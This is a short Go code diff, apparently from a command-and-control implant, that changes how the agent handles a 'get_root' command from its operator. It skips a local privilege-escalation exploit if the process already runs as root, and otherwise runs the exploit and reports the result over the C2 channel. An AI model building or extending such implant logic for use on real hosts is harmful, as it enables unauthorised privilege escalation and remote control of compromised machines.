@@ -96,10 +96,14 @@ func processCCData(data *MsgTunData) {
 
 		// get_root
 		if cmdSlice[0] == "get_root" {
-			err = GetRoot()
-			out = fmt.Sprintf("Xorg LPE exploit failed:\n%v", err)
-			if err == nil {
-				out = "Got root!"
+			if os.Geteuid() == 0 {
+				out = "You already have root!"
+			} else {
+				err = GetRoot()
+				out = fmt.Sprintf("LPE exploit failed:\n%v", err)
+				if err == nil {
+					out = "Got root!"
+				}
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
